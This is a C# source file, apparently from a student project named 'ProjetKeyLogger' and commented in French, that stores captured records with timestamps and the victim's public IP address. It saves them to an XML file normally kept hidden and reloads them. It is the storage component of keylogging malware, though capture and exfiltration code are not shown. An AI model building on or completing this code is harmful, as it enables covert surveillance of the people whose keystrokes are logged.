using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using System.Xml.Serialization;

namespace ProjetKeyLogger
{
    [Serializable]
    public class CollectionEnregistrement
    {
        //Liste des enregistrements
        private List<Enregistrement> list_enregistrement;

        //proprieté en lecture / ecriture
        public List<Enregistrement> List_Enregistrement
        {
            get
            {
                return list_enregistrement;
            }
            set
            {
                list_enregistrement = value;
            }
        }

        //Constructeur
        public CollectionEnregistrement()
        {
            //instanciation de la liste enregistrement
            list_enregistrement = new List<Enregistrement>();
        }

        //Ajoute un enregistrement a la collection en initialisant la date et l'adresse
        public void ajouterNew(Enregistrement enregistrement)
        {
            //Si l'enregistrement est ni vide ni nulle
            if (enregistrement.Contenu != null && enregistrement.Contenu != "")
            {
                //On définit l'adresse ip publique
                enregistrement.adresseIpPublique();

                //mise a jour de la date
                enregistrement.dateTimeNow();

                //On ajoute a la liste l'enregistrement courrant
                list_enregistrement.Add(enregistrement);
            }
        }

        //Ajoute un enregistrement dont la date et l'adresse sont deja connu et ne doivent pas etre modifier
        public void ajouter(Enregistrement enregistrement)
        {
            //Ajout d'un enregistrement a la collection
            list_enregistrement.Add(enregistrement);
        }

        //sauvegarde dans un fichier XML
        public void saveToXml(string file_path)
        {
            //On vérifie si le fichier existe
            if (File.Exists(file_path))
            {
                //Recupere les attributs du fichier
                FileAttributes attributs = File.GetAttributes(file_path);
                //on enleve le statut caché pour pouvoir ecrire dans le fichier
                attributs = RemoveAttribute(attributs, FileAttributes.Hidden);
                //Modifie les attributs du fichier après avoir ete réinitialisé
                File.SetAttributes(file_path, attributs);
            }
           
            //Fichier XML en mode création
            FileStream file = File.Open(file_path, FileMode.Create);

            //Ecriture de la collection
            XmlSerializer serializer = new XmlSerializer(typeof(CollectionEnregistrement));
            serializer.Serialize(file, this);

            //fermeture du fichier
            file.Close();
        }

        //sert pour enlever le statut cacher
        private FileAttributes RemoveAttribute(FileAttributes attributs, FileAttributes hidden)
        {
            return attributs & ~hidden;
        }

        //Chargement des fichiers XML
        public static CollectionEnregistrement loadFromXML(string nomFichier)
        {
            //Fichier en mode ouverture
            FileStream file = File.Open(nomFichier, FileMode.Open);
            XmlSerializer serializer = new XmlSerializer(typeof(CollectionEnregistrement));

            //Création de la collection en deserialisant le fichier
            CollectionEnregistrement collection_enregistrement = (CollectionEnregistrement)serializer.Deserialize(file);
            
            //Fermeture du fichier
            file.Close();

            //On retourne la collection créée
            return collection_enregistrement;
        }
    }
}
